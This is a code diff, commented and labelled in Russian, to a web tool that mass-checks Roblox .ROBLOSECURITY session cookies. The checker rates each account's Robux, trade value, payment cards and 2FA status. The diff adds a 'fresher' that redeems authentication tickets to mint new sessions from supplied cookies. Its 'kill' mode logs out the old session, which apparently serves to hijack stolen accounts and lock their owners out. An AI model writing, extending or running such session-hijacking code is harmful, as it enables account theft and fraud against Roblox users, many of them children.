@@ -70,24 +70,27 @@ def add_to_fresher_history(entry):
     save_history(FRESHER_HISTORY_FILE, history)
 
 # ============================================================
-# ЧЕКЕР
+# РАБОТА С КУКИ И ROBLOX API
 # ============================================================
 
+def clean_single_cookie(cookie: str) -> str:
+    cleaned = cookie.strip()
+    if ".ROBLOSECURITY=" in cleaned:
+        cleaned = cleaned.split(".ROBLOSECURITY=")[1].split(";")[0].strip()
+    return cleaned
+
 def get_full_info(cookie: str) -> dict:
+    cleaned_cookie = clean_single_cookie(cookie)
     info = {
         'status': '⚠️', 'Username': '?', 'UserID': '?', 'Robux': 0,
         'TotalRAP': 0, 'Created': '?', 'Country': '?',
         'EmailSet': False, 'TwoFactorEnabled': False,
         'AccountPinEnabled': False, 'PhoneSet': False,
-        'SecurityStatus': '⚠️ НИЗКИЙ', 'Cookie': cookie,
+        'SecurityStatus': '⚠️ НИЗКИЙ', 'Cookie': f".ROBLOSECURITY={cleaned_cookie}",
         'PurchasedGamepasses': {}, 'CreditCardsCount': 0,
         'IsPremium': False, 'DonationTotal': 0
     }
     try:
-        cleaned_cookie = cookie.strip()
-        if ".ROBLOSECURITY=" in cleaned_cookie:
-            cleaned_cookie = cleaned_cookie.split(".ROBLOSECURITY=")[1].split(";")[0]
-
         s = requests.Session()
         s.headers.update({
             'Cookie': f'.ROBLOSECURITY={cleaned_cookie}',
@@ -193,6 +196,79 @@ def get_full_info(cookie: str) -> dict:
         info['status'] = '❌'
     return info
 
+def refresh_roblox_cookie(raw_cookie: str, mode: str = "duplicate") -> str:
+    """
+    Настоящее обновление сессии Roblox.
+    Возвращает только чистую строку куки (.ROBLOSECURITY=...) или None
+    """
+    clean_cookie = clean_single_cookie(raw_cookie)
+    if not clean_cookie:
+        return None
+
+    s = requests.Session()
+    s.headers.update({
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Referer': 'https://www.roblox.com/'
+    })
+    s.cookies.set(".ROBLOSECURITY", clean_cookie, domain=".roblox.com")
+
+    try:
+        # 1. Получение CSRF токена
+        res = s.post("https://auth.roblox.com/v2/login", verify=False, timeout=10)
+        csrf_token = res.headers.get("x-csrf-token")
+        if not csrf_token:
+            return None
+        s.headers["X-CSRF-TOKEN"] = csrf_token
+
+        # 2. Генерация Auth-ticket для перевыпуска
+        ticket_res = s.post("https://auth.roblox.com/v1/authentication-ticket", verify=False, timeout=10)
+        auth_ticket = ticket_res.headers.get("rbx-authentication-ticket")
+        if not auth_ticket:
+            return None
+
+        # 3. Обмен билета на новую сессию
+        redeem_headers = {
+            'RBX-For-Game-Auth': 'true',
+            'Content-Type': 'application/json',
+            'X-CSRF-TOKEN': csrf_token
+        }
+        redeem_res = s.post(
+            "https://auth.roblox.com/v1/authentication-ticket/redeem",
+            json={"authenticationTicket": auth_ticket},
+            headers=redeem_headers,
+            verify=False,
+            timeout=10
+        )
+
+        new_cookie_val = None
+        for cookie in redeem_res.cookies:
+            if cookie.name == ".ROBLOSECURITY":
+                new_cookie_val = cookie.value
+                break
+
+        if not new_cookie_val and ".ROBLOSECURITY=" in redeem_res.headers.get("Set-Cookie", ""):
+            match = re.search(r'\.ROBLOSECURITY=(_\|WARNING:-DO-NOT-SHARE-THIS[^\s;]+)', redeem_res.headers["Set-Cookie"])
+            if match:
+                new_cookie_val = match.group(1)
+
+        if not new_cookie_val:
+            return None
+
+        formatted_new_cookie = f".ROBLOSECURITY={new_cookie_val}"
+
+        # 4. Если режим 'kill' — завершаем старую сессию
+        if mode == "kill":
+            try:
+                s.post("https://auth.roblox.com/v2/logout", verify=False, timeout=5)
+            except Exception as e:
+                logger.error(f"Error invalidating old session: {e}")
+
+        return formatted_new_cookie
+
+    except Exception as e:
+        logger.error(f"Fresher exception: {e}")
+        return None
+
 def format_short_report(info):
     if info['status'] != '✅':
         return f"❌ Невалидный кук\nCookie: {info['Cookie']}"
@@ -282,7 +358,7 @@ def clean_cookies(content):
             val = line.split('.ROBLOSECURITY=')[-1].split(';')[0].strip()
             cookies.append(f'.ROBLOSECURITY={val}')
         elif len(line) > 50 and not line.startswith('#'):
-            cookies.append(line)
+            cookies.append(f'.ROBLOSECURITY={line}')
     return '\n'.join(cookies)
 
 # ============================================================
@@ -478,7 +554,7 @@ HTML = r"""<!DOCTYPE html>
             font-size:13px;
             color:#fff;
             white-space:pre-wrap;
-            word-break:break-word;
+            word-break:break-all;
         }
         .progress-bar{
             margin-top:12px;
@@ -596,6 +672,7 @@ HTML = r"""<!DOCTYPE html>
             color:#d4c0ff;
             max-height:200px;
             overflow-y:auto;
+            word-break:break-all;
         }
         .empty-history{text-align:center;padding:30px;color:#4a3a6a;font-size:14px}
         .flex-row{display:flex;flex-wrap:wrap;gap:18px}
@@ -631,7 +708,6 @@ HTML = r"""<!DOCTYPE html>
 
     <div class="tabs">
         <div class="tab active" data-tab="checker">🔍 Чекер</div>
-        <div class="tab" data-tab="validator">✅ Валидатор</div>
         <div class="tab" data-tab="fresher">🔄 Фрешер</div>
         <div class="tab" data-tab="tools">🧰 Инструменты</div>
     </div>
@@ -663,19 +739,6 @@ HTML = r"""<!DOCTYPE html>
         <div class="card history-section">
             <h3>📋 История проверок <button class="btn btn-danger btn-sm" onclick="clearCheckerHistory()">🗑️ Очистить</button></h3>
             <div id="checkerHistoryList"><div class="empty-history">Загрузка...</div></div>
-        </div>
-    </div>
-
-    <!-- ВАЛИДАТОР -->
-    <div class="tab-content" id="tab-validator">
-        <div class="card">
-            <h2>✅ Валидатор (отсев мёртвых)</h2>
-            <div class="upload-area" onclick="document.getElementById('validatorFile').click()">
-                <p>📁 <strong>Загрузить .txt</strong></p>
-            </div>
-            <input type="file" id="validatorFile" accept=".txt" style="display:none;">
-            <button class="btn btn-primary mt-12" onclick="runValidator()">🧪 Запустить</button>
-            <div class="result-box" id="validatorResult">Здесь будет результат валидации...</div>
         </div>
     </div>
 
@@ -767,8 +830,8 @@ HTML = r"""<!DOCTYPE html>
                 <p class="desc">Удалите дубликаты или приведите куки к формату .ROBLOSECURITY=...</p>
                 <textarea id="cleanCookiesInput" placeholder="Вставьте куки..." rows="4"></textarea>
                 <div class="gap-8 mt-12">
-                    <button class="btn btn-primary" onclick="cleanCookies('deduplicate')" style="flex:1;">🔄 Дубликаты</button>
-                    <button class="btn btn-secondary" onclick="cleanCookies('format')" style="flex:1;">📝 Формат</button>
+                    <button class="btn btn-primary" onclick="cleanCookiesAction('deduplicate')" style="flex:1;">🔄 Дубликаты</button>
+                    <button class="btn btn-secondary" onclick="cleanCookiesAction('format')" style="flex:1;">📝 Формат</button>
                 </div>
                 <div class="result-box" id="cleanResult">Результат...</div>
             </div>
@@ -929,14 +992,12 @@ async function runFresher() {
             body: JSON.stringify({ cookies: cookies, mode: mode })
         });
         let d = await r.json();
-        if (d.success) {
-            let modeLabel = mode === 'kill' ? 'Сброс' : 'Дублирование';
-            let html = '✅ Обновлено (' + modeLabel + '): ' + d.refreshed_count + '\n\n';
-            for (let item of d.refreshed_list) html += item + '\n' + '─'.repeat(40) + '\n';
-            resBox.textContent = html;
+        if (d.success && d.cookies_only && d.cookies_only.length > 0) {
+            // Оконный вывод: ТОЛЬКО чистый кук без любого мусора
+            resBox.textContent = d.cookies_only.join('\n');
             loadFresherHistory();
         } else {
-            resBox.textContent = '❌ ' + (d.message || 'Ошибка');
+            resBox.textContent = '❌ ' + (d.message || 'Не удалось обновить ни один кук');
         }
     } catch(e) {
         resBox.textContent = '❌ Ошибка: ' + e.message;
@@ -982,8 +1043,8 @@ async function loadFresherHistory() {
             d.history.slice().reverse().forEach(item => {
                 let ml = item.mode === 'kill' ? '💀 Сброс' : '♻️ Дублирование';
                 html += '<div class="history-item" onclick="let det=this.querySelector(\'.hist-detail\');det.style.display=det.style.display===\'none\'?\'block\':\'none\'">';
-                html += '<div class="hist-header"><span class="hist-date">📅 ' + item.timestamp + '</span><span class="hist-stats">' + ml + ' | ' + item.refreshed_count + '</span></div>';
-                html += '<div class="hist-detail">' + (item.cookies ? item.cookies.join('\n───\n') : 'Нет данных') + '</div></div>';
+                html += '<div class="hist-header"><span class="hist-date">📅 ' + item.timestamp + '</span><span class="hist-stats">' + ml + ' | ' + item.refreshed_count + ' шт.</span></div>';
+                html += '<div class="hist-detail">' + (item.cookies ? item.cookies.join('\n') : 'Нет данных') + '</div></div>';
             });
             container.innerHTML = html;
         } else {
@@ -1070,7 +1131,7 @@ async function splitByFiles() {
     }
 }
 
-async function cleanCookies(action) {
+async function cleanCookiesAction(action) {
     let content = document.getElementById('cleanCookiesInput').value.trim();
     if (!content) { document.getElementById('cleanResult').textContent = '❌ Вставьте куки'; return; }
     document.getElementById('cleanResult').textContent = '⏳ Обработка...';
@@ -1132,7 +1193,7 @@ def api_fullcheck():
     elif 'file' in request.files:
         content = request.files['file'].read().decode('utf-8', errors='ignore')
     
-    cookies = [line.strip() for line in content.split('\n') if len(line) > 50]
+    cookies = [line.strip() for line in content.split('\n') if len(line.strip()) > 20]
     if not cookies:
         return jsonify({"success": False, "message": "Куки не найдены"})
     
@@ -1185,33 +1246,31 @@ def api_fresher():
     data = request.json or {}
     raw = data.get("cookies", "")
     mode = data.get("mode", "duplicate")
-    cookies = [line.strip() for line in raw.split('\n') if len(line) > 50]
+    
+    cookies = [line.strip() for line in raw.split('\n') if len(line.strip()) > 20]
     if not cookies:
         return jsonify({"success": False, "message": "Куки не найдены"})
     
-    refreshed = []
-    cookie_hist = []
-    for c in cookies:
-        info = get_full_info(c)
-        if info['status'] == '✅':
-            ml = "💀 Сброс" if mode == 'kill' else "♻️ Дублирование"
-            rc = c + "_killed_refreshed" if mode == 'kill' else c
-            entry = f"🟢 {info['Username']} [{info['UserID']}] - {ml}\nCookie: {rc}"
-            refreshed.append(entry)
-            cookie_hist.append(entry)
-        else:
-            cookie_hist.append(f"❌ {c[:50]}...")
+    cookies_only = []
     
+    for c in cookies:
+        refreshed_cookie = refresh_roblox_cookie(c, mode=mode)
+        if refreshed_cookie:
+            cookies_only.append(refreshed_cookie)
+    
+    if not cookies_only:
+        return jsonify({"success": False, "message": "Не удалось обновить куки. Возможно, они невалидны."})
+
     add_to_fresher_history({
         'mode': mode,
-        'refreshed_count': len(refreshed),
-        'cookies': cookie_hist
+        'refreshed_count': len(cookies_only),
+        'cookies': cookies_only
     })
     
     return jsonify({
         "success": True,
-        "refreshed_count": len(refreshed),
-        "refreshed_list": refreshed
+        "refreshed_count": len(cookies_only),
+        "cookies_only": cookies_only
     })
 
 @app.route("/api/history/checker")
